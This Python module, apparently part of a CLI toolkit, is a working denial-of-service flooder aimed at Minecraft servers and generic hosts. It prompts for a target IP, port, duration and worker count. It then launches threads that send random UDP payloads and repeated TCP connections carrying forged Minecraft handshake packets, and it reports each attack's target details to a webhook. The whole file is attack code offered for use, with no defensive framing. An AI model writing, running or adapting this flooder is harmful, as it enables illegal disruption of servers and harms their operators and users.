# language: Python, file: modules/ddoser.py
# Minecraft / generic UDP+TCP flood module (Paper-era compatible)

import socket
import threading
import random
import time
import struct
from rich.console import Console
from rich.prompt import Prompt, IntPrompt

from aethelcli.webhook import report_module

console = Console()

def _udp_worker(ip: str, port: int, duration: int, size: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    payload = random.randbytes(size)
    while time.time() < end:
        try:
            sock.sendto(payload, (ip, port))
        except Exception:
            pass
    sock.close()

def _tcp_worker(ip: str, port: int, duration: int):
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.7)
            s.connect((ip, port))
            host_b = ip.encode()
            pkt = b"\x00" + struct.pack(">H", 767) + struct.pack(">H", len(host_b)) + host_b
            pkt += struct.pack(">H", port) + b"\x01"
            s.send(struct.pack(">H", len(pkt)) + pkt + random.randbytes(64))
            s.close()
        except Exception:
            pass

def run() -> None:
    console.print("[bold cyan]▸ Ddoser[/]")
    target = Prompt.ask("  target IP")
    port = IntPrompt.ask("  port", default=25565)
    duration = IntPrompt.ask("  duration (s)", default=60)
    workers = IntPrompt.ask("  workers", default=40)
    mode = Prompt.ask("  mode", choices=["udp", "tcp", "both"], default="both")

    report_module("Ddoser", {"target": target, "port": port, "mode": mode, "workers": workers})

    console.print(f"[yellow]launching {workers} workers → {target}:{port} ({mode})[/]")
    threads = []
    half = max(1, workers // 2)

    if mode in ("udp", "both"):
        for _ in range(half):
            t = threading.Thread(target=_udp_worker, args=(target, port, duration, 1024), daemon=True)
            t.start()
            threads.append(t)
    if mode in ("tcp", "both"):
        for _ in range(half):
            t = threading.Thread(target=_tcp_worker, args=(target, port, duration), daemon=True)
            t.start()
            threads.append(t)

    for t in threads:
        t.join()
    console.print("[green]done[/]\n")
